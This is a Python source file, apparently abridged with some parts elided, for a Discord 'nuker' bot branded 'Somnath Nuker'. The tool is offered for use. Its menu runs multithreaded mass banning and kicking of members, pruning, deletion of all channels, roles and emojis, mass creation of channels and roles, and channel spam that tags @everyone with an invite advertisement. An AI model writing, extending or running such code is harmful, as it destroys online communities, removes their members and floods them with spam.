"""
NIYAM EK HI HAI LOYAL REHNA HOGA 
...
options = """
         ╚╦╗                                                             ╔╦╝
     ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
     ╩ ({}1{}) {}< {}Mass Ban         ║ ({}5{}) {}< {}Create Roles      ║ ({}9{})  {}< {}Spam Channels   ╩
       ({}2{}) {}< {}Mass Kick        ║ ({}6{}) {}< {}Delete Channels   ║ ({}10{}) {}< {}Exit
       ({}3{}) {}< {}Prune            ║ ({}7{}) {}< {}Delete Roles      ║        
     ╦ ({}4{}) {}< {}Mass Channels    ║ ({}8{}) {}< {}Delete Emojis     ║                        ╦
     ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
          ╔╩╝                                                             ╚╩╗
...
class NUKER:
    ...
    def execute_createchannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
    ...
    def execute_createroles(self, guildid: str, rolesname: str, token: str):
    ...
    def execute_deletechannels(self, channel: str, token: str):
        while True:
    ...
    def execute_deleteroles(self, guildid: str, role: str, token: str):
        while True:
    ...
    def execute_deleteemojis(self, guildid: str, emoji: str, token: str):
        while True:
    ...
    def menu(self):
        print(STEVEXSOMNATH + options + "\n")
        ans = input("{}({}SOMNATH{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}SOMNATH{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            if scrape.lower() == "n":
                try:
            ...
            time.sleep(3)
            print("{}({}SOMNATH{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}SOMNATH{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            days = int(input("{}({}SOMNATH{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            self.execute_prune(guildid, days, token)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["4", "04"]:
            type = input("{}({}SOMNATH{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            chaizer = (input("{}({}SOMNATH{}) Channles Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            amount = int(input("{}({}SOMNATH{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_createchannels, args=(guildid, (chaizer), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SOMNATH{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["5", "05"]:
            raizer = (input("{}({}SOMNATH{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            amount = int(input("{}({}SOMNATH{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_createroles, args=(guildid, (raizer), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SOMNATH{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            ...
            for channel in channels:
                t = threading.Thread(target=self.execute_deletechannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SOMNATH{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            ...
            for role in roles:
                t = threading.Thread(target=self.execute_deleteroles, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SOMNATH{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            ...
            for emoji in emojis:
                t = threading.Thread(target=self.execute_deleteemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}SOMNATH{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            ...
            amount = int(input("{}({}SOMNATH{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            Aizer1 = (input("{}({}SOMNATH{}) Content{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            Aizer = Aizer1 + ('\n **@everyone Steve x Somnath Runs Cord ** https://discord.gg/sp1it')
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            ...
            time.sleep(3)
            print("{}({}SOMNATH{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1.5)
            self.menu()
            
        
        elif ans == "10":
            print("{}({}SOMNATH{}) Thanks for using Somnath Nuker!".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)
...
@__client__.event
async def on_ready():
    print("{}({}SOMNATH{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", f"{__client__.user.name}#{__client__.user.discriminator}"))
    time.sleep(1.5)
    NUKER().menu()
...
if __name__ == "__main__":
    try:
        guildid = input("{}({}SOMNATH{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
